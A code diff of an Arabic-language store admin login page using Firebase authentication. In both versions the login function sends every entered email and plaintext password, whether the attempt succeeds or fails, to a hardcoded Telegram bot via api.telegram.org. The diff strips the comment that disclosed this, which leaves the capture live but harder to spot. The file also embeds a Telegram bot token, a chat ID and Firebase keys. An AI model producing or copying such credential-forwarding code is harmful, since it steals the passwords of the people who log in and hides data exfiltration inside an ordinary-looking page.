@@ -63,12 +63,11 @@
 
     <div id="adminPanel" class="hidden">
         <header class="admin-header">
-            <h1>⚙️ لوحة التحكم</h1>
+            <h1>⚙️ لوحة التحكم - البيت الرقمي</h1>
             <button class="logout-btn" onclick="logout()">🚪 خروج</button>
         </header>
         <div class="admin-container">
             <div class="admin-grid">
-                <!-- جميع الأقسام التي ذكرتها -->
                 <a href="admin-products.html" class="admin-card"><div class="admin-card-icon">📦</div><div class="admin-card-title">عرض المنتجات</div></a>
                 <a href="admin-add.html" class="admin-card"><div class="admin-card-icon">➕</div><div class="admin-card-title">إضافة منتج</div></a>
                 <a href="admin-edit.html" class="admin-card"><div class="admin-card-icon">✏️</div><div class="admin-card-title">تعديل المنتجات</div></a>
@@ -77,7 +76,6 @@
                 <a href="admin-itemids.html" class="admin-card"><div class="admin-card-icon">🏷️</div><div class="admin-card-title">معرفات السلع</div></a>
                 <a href="admin-ranges.html" class="admin-card"><div class="admin-card-icon">🔢</div><div class="admin-card-title">نطاقات المعرفات</div></a>
                 <a href="admin-products-readonly.html" class="admin-card"><div class="admin-card-icon">👁️</div><div class="admin-card-title">عرض بدون أسعار</div></a>
-                <!-- الأقسام الجديدة التي أضفتها -->
                 <a href="admin-coupons.html" class="admin-card"><div class="admin-card-icon">🎟️</div><div class="admin-card-title">كوبونات الخصم</div></a>
                 <a href="admin-stats-advanced.html" class="admin-card"><div class="admin-card-icon">📈</div><div class="admin-card-title">إحصائيات متقدمة</div></a>
                 <a href="banners.html" class="admin-card"><div class="admin-card-icon">🖼️</div><div class="admin-card-title">البنرات</div></a>
@@ -88,11 +86,9 @@
     <div id="toast" class="toast"></div>
 
     <script type="module">
-        // استيراد Firebase SDK
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getAuth, signInWithEmailAndPassword, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-        // 🔑 إعدادات Firebase الخاصة بالمشروع
         const firebaseConfig = {
             apiKey: "AIzaSyC2f4rJBBBOe6qfa2EU1WfspUB5uibgwnM",
             authDomain: "hussain-1290b.firebaseapp.com",
@@ -102,36 +98,22 @@
             appId: "1:798281706738:web:79314f6feb2add0bf5f46b"
         };
 
-        // تهيئة Firebase
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
 
-        // إعدادات بوت تيليجرام
         const TELEGRAM_BOT_TOKEN = "8224453502:AAE72lDosgRpoKZwT4TQhyfRLodcsd37ID8";
         const TELEGRAM_CHAT_ID = "7748217145";
 
-        // دالة إرسال رسالة إلى تيليجرام
         async function sendTelegramMessage(message) {
             try {
-                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-                const response = await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
                 });
-                if (!response.ok) {
-                    console.error("فشل إرسال إشعار التيليجرام");
-                }
-            } catch (error) {
-                console.error("خطأ في إرسال إشعار التيليجرام:", error);
-            }
+            } catch(e) { console.error(e); }
         }
 
-        // مراقبة حالة تسجيل الدخول
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 document.getElementById('loginContainer').classList.add('hidden');
@@ -139,13 +121,11 @@
             } else {
                 document.getElementById('loginContainer').classList.remove('hidden');
                 document.getElementById('adminPanel').classList.add('hidden');
-                // تنظيف الحقول
                 document.getElementById('adminEmail').value = '';
                 document.getElementById('adminPassword').value = '';
             }
         });
 
-        // دالة تسجيل الدخول
         window.loginWithEmail = async function() {
             const email = document.getElementById('adminEmail').value.trim();
             const password = document.getElementById('adminPassword').value;
@@ -156,24 +136,16 @@
             try {
                 await signInWithEmailAndPassword(auth, email, password);
                 showToast("✅ تم الدخول بنجاح");
-
-                // إرسال إشعار إلى تيليجرام يحتوي على البريد الإلكتروني وكلمة السر
                 const now = new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' });
-                const message = `🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 <b>البريد الإلكتروني:</b> ${email}\n🔑 <b>كلمة السر:</b> ${password}\n🕒 <b>الوقت:</b> ${now}\n🌐 <b>المتصفح:</b> ${navigator.userAgent.substring(0, 100)}`;
-                await sendTelegramMessage(message);
-
-            } catch (error) {
-                console.error("خطأ Firebase:", error.code, error.message);
+                await sendTelegramMessage(`🔐 <b>دخول جديد إلى لوحة الإدارة</b>\n\n📧 ${email}\n🔑 ${password}\n🕒 ${now}`);
+            } catch(error) {
                 let msg = "❌ فشل الدخول";
                 if (error.code === 'auth/user-not-found') msg = "❌ البريد الإلكتروني غير مسجل";
                 else if (error.code === 'auth/wrong-password') msg = "❌ كلمة السر خاطئة";
                 else if (error.code === 'auth/invalid-email') msg = "❌ صيغة البريد غير صحيحة";
-                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً، حاول لاحقاً";
+                else if (error.code === 'auth/too-many-requests') msg = "❌ تم تعطيل الحساب مؤقتاً";
                 showToast(msg);
-
-                // إرسال إشعار بالفشل
-                const failMessage = `⚠️ <b>محاولة دخول فاشلة</b>\n\n📧 البريد: ${email}\n🔑 كلمة السر: ${password}\n❌ السبب: ${msg}`;
-                await sendTelegramMessage(failMessage);
+                await sendTelegramMessage(`⚠️ <b>محاولة دخول فاشلة</b>\n📧 ${email}\n🔑 ${password}\n❌ ${msg}`);
                 document.getElementById('adminPassword').value = '';
             }
         };
@@ -190,7 +162,6 @@
             setTimeout(() => toast.classList.remove('show'), 3000);
         }
 
-        // الضغط على Enter في حقل كلمة السر
         document.getElementById('adminPassword')?.addEventListener('keypress', (e) => {
             if (e.key === 'Enter') loginWithEmail();
         });
